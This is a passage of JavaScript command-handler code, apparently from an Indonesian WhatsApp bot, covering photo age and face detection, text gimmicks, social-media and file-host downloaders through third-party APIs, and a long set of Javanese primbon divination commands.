                           break
case '7cekumur': case '7agedetect': {
	if (!quoted) throw `Send/Reply foto wajah dengan Caption ${prefix + command}`
	m.reply(mess.wait)
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)
	let ini = await fetchJson(`https://api.lolhuman.xyz/api/agedetect?apikey=${global.apilol}&img=${anu}`)
replay(`Orang tersebut kira-kira berumur  ${ini.result} Tahun`)
                  }
                           break
case '7cekwajah': case '7facedetec': {
	if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
	let anu = await TelegraPh(media)

                XeonBotInc.sendMessage(m.chat, { image: { url: api('zenz',`/facedetect?apikey=${global.apilol}&img=${anu}`) }, caption: `Wajah detektor` }, { quoted: m })      
                }
                break
            case '74l4y': case '7alay': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/alay?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '7besarkecil': case '7kecilbesar': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/upperlower?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '7bahasapurba': case '7purba': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/bahasapurba?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break
case '7randombahasa': case '7bahasarandom': {
            	if (!text) throw `*Masukan Teks !*\n_Contoh :_ ${prefix + command} dasar anak tiktok suka joget pargoy di tempat umum`
anu = await fetchJson(`https://api.lolhuman.xyz/api/randombahasa?apikey=${global.apilol}&text=${text}`)
m.reply(anu.result)
}
break



//[DOWNLOAD MENU]\\ WITH Apikey Lol-Human, credit (Fleyvin Software)
case '7mediafire': case '7mdf': {
                   if (!text) throw `*Masukan Link Mediafire*\n_Contoh :_ ${prefix + command} https://www.mediafire.com/file/nf8gcek9mkvdlek/20220403_152001.png/file`
             	let anu = await fetchJson(api('zenz', '/mediafire', { url: text }, 'apikey'))
             asu = anu.result.link
             nama = anu.result.filename
             let type = anu.result.filetype
             if (type === 'Image (.JPG)') {
             	replay(mess.wait)
             XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'image/png' , fileName: nama }, {quoted:m})
            }else if (type === 'Image (.PNG)') {
            	replay(mess.wait)
             XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'image/png' , fileName: nama }, {quoted:m})
               }else if (type === 'video (.mp4)') {
               	replay(mess.wait)
             XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'video/mp4' , fileName: nama }, {quoted:m})
              }else if (type === 'audio (.mp3)') {
              	replay(mess.wait)
             XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'audio/mp3' , fileName: nama }, {quoted:m})
                }else if (type === 'PDF (.PDF)') {
                	replay(mess.wait)
             XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/pdf' , fileName: nama }, {quoted:m})
             } else if (type === 'Source Code (.JS)') {
             	replay(mess.wait)
		XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
		  } else {
			replay(mess.wait)
		XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
            }
          }
          break
case '7sfile': case '7sfilemobi': {
                   if (!text) throw `*Masukan Link SfileMobi*\n_Contoh :_ ${prefix + command} https://sfile.mobi/3Ca9II8GKsP`
                   replay(mess.wait)
             	let anu = await fetchJson(api('zenz', '/sfile', { url: text }, 'apikey'))
             asu = anu.result.link
             nama = anu.result.title
		XeonBotInc.sendMessage(m.chat, {document: {url: asu }, mimetype: 'application/zip' , fileName: nama }, {quoted:m})
            }
          break
	                  case '7tt': case '7ttdownload': case '7ttdl': case '7tiktok': case '7tiktoknowm': {
                  if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result },
                    caption: `Download From ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
                 case '7ttmp3': case '7tiktokmp3': case '7tiktokaudio': {
                if (!text) throw `*Masukan Link TikTok*\n_Contoh :_ ${prefix + command} https://vt.tiktok.com/ZSdAvGKjn/`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/tiktok3', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}tiktoknowm ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(anu.result)
		let cnvrt = await toAudio(nganu, 'mp4')
                XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
                      case '7igtv': case '7instagramtv': case '7igpost': case '7igmp4': case '7igdl': case '7igvideo': case '7instagramvideo': case '7instagrammp4': case '7instagram': {
                if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
                let aru = anu.result.media
                let result = aru[Math.floor(Math.random() * aru.length)]
                let buttons = [
                    {buttonId: `${prefix}igtvmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: result },
                    caption: `*〔 Instagram tv Video 〕*

*⭔ Username :* ${anu.result.account.username}
*⭔ Caption :* ${anu.result.caption}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '7instagrammp3':  case '7igtvmp3': case '7instagramtvmp3': {
               if (!text) throw `*Masukan Link Instagram tv/post*\n_Contoh :_ ${prefix + command} https://www.instagram.com/tv/Ccn0eqaPxGx/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagram2', { url: text }, 'apikey'))
                let asu = anu.result.media
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix}igreel ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `*〔 Instagram tv mp3 〕*

*⭔ Username :* ${anu.result.account.username}
*⭔ Caption :* ${anu.result.caption}
*⭔ Link :* ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(result)
		let cnvrt = await toAudio(nganu, 'mp4')
                XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
            case '7igreel': case '7instagramreels': case '7instagramreel': case '7igreels': {
                if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}igreelmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.link },
                    caption: `*〔 Instagram Reels 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Username :* ${anu.result.owner}
*⭔ Like :* ${anu.result.like}
*⭔ Viewers :* ${anu.result.view}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '7igreelmp3': case '7igreelsmp3': {
               if (!text) throw `*Masukan Link Instagram Reels*\n_Contoh :_ ${prefix + command} https://www.instagram.com/reel/CQffYpUJK5d/?igshid=YmMyMTA2M2Y=`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/instagramreel', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}igreel ${text}`, buttonText: {displayText: '🎦Video'}, type: 1},
                ]
                let buttonMessage = {
                    text: `*〔 Instagram Reels MP3 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Username :* ${anu.result.owner}
*⭔ Like :* ${anu.result.like}
*⭔ Viewers :* ${anu.result.view}
*⭔ Link :* ${text}`,
                    footer: 'Audio akan segera di kirim',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
		let { toAudio } = require('./lib/converter')
		let nganu = await getBuffer(anu.result.link)
		let cnvrt = await toAudio(nganu, 'mp4')
                XeonBotInc.sendMessage(m.chat, { audio: cnvrt, mimetype: 'audio/mpeg'}, { quoted: m })
            }
            break
            case '7twittermp4': case '7twittervideo': case '7tw': case '7twmp4': case '7twvideo': {
                if (!text) throw `*Masukan Link Twitter Video*\n_Contoh :_ ${prefix + command} https://twitter.com/vitaminreceh/status/1330465270595543041?t=QXZcrz2cFHV9e54Ij3lYIQ&s=19`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/twitter', { url: text }, 'apikey'))
                let asu = anu.result.link
                let result = asu[Math.floor(Math.random() * asu.length)]
                let buttons = [
                    {buttonId: `${prefix}menu`, buttonText: {displayText: '</Menu'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: result.link },
                    caption: `*〔 Twitter Video 〕*

*⭔ Title :* ${anu.result.title}
*⭔ Link :* ${text}`,
                    footer: 'Klik Tombol Di Bawah',
                    buttons: buttons,
                    headerType: 5
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
          case '7twitterimage': case '7twimage': case '7twitterfoto': case '7twfoto': case '7teitterjpg': {
                if (!text) throw `*Masukan Link Twitter Image*\n_Contoh :_ ${prefix + command} https://twitter.com/caci_ann/status/1514256565661954050?t=07p_yly64BkdOMmw_UzX6A&s=19`
                replay(mess.wait)
                let anu = await fetchJson(api('zenz', '/twitterimage', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `${prefix}menu`, buttonText: {displayText: '</Menu'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.result.link },
                    caption: `*〔 Twitter Image 〕*

*⭔ Name :* ${anu.result.user.name}
*⭔ Username :* ${anu.result.user.username}
*⭔ Title :* ${anu.result.title}
*⭔ Publish :* ${anu.result.publish}
*⭔ Link :* ${text}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
//Primbon Menu  ]\\ 
               case '7nomerhoki': case '7nomorhoki': {
                if (!Number(text)) throw `*Masukan Nomor !*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case '7artimimpi': case '7tafsirmimpi': {
                if (!text) throw `*Masukan Mimpimu !*\n_Contoh:_ ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case '7ramalanjodoh': case '7ramaljodoh': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005, Nissa, 29, 3, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7ramalanjodohbali': case '7ramaljodohbali': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7suamiistri': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7ramalancinta': case '7ramalcinta': {
                if (!text) throw `*Masukan nama1,tanggal,bulan,tahun lahir,nama2,tanggal,bulan,tahun lahir*\n_Contoh:_  Fazrin, 05, 09, 2005, Nissa, 14, 4, 2006`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7artinama': {
                if (!text) throw `*Masukan nama !*\n_Contoh:_ ${prefix + command} Fazrin Mauza`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7kecocokannama': case '7cocoknama': {
                if (!text) throw `*Masukam nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin, 05, 09, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case '7kecocokanpasangan': case '7cocokpasangan': case '7pasangan': {
                if (!text) throw `Example : ${prefix + command} Fazrin|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case '7jadianpernikahan': case '7jadiannikah': {
                if (!text) throw `*Masukan tanggal jadian nikah!*\n_Contoh:_  ${prefix + command} 6,12,2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case '7sifatusaha': {
                if (!text)throw `*Masukan tanggal usaha berdiri!*\n_Contoh:_ ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case '7rejeki': case '7rezeki': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7pekerjaan': case '7kerja': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7ramalannasib': case '7ramalnasib': case '7nasib': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case '7potensipenyakit': case '7penyakit': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7artitarot': case '7tarot': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir !*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7fengshui': {
                if (!text) throw `*Masukan nama,gender,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,1,2005\n\n_Note : Gender : 1 untuk laki-laki & 2 untuk perempuan_`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case '7haribaik': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7harisangar': case '7taliwangke': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7harinaas': case '7harisial': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case '7nagahari': case '7harinaga': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7arahrejeki': case '7arahrezeki': {
                if (!text) throw `*Masukan tanggal,bulan,tahun*\n_Contoh:_ ${prefix + command} 5, 9, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7peruntungan': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir,untuk tahun*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005,2022`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7weton': case '7wetonjawa': {
                if (!text) throw `*Masukan tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} 5, 9, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case '7sifat': case '7karakter': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case '7keberuntungan': {
                if (!text) throw `*Masukan nama,tanggal,bulan,tahun lahir*\n_Contoh:_ ${prefix + command} Fazrin,5, 9, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case '7memancing': {
                if (!text) throw `*Masukan tanggal,bulan,tahun !*\n_Contoh:_ ${prefix + command} 5, 5, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case '7masasubur': {
                if (!text) throw `*Masukan tanggal,bulan,tahun pertama menstruasi,siklus!*\n_Contoh:_ ${prefix + command} 5, 5, 2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                XeonBotInc.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break        
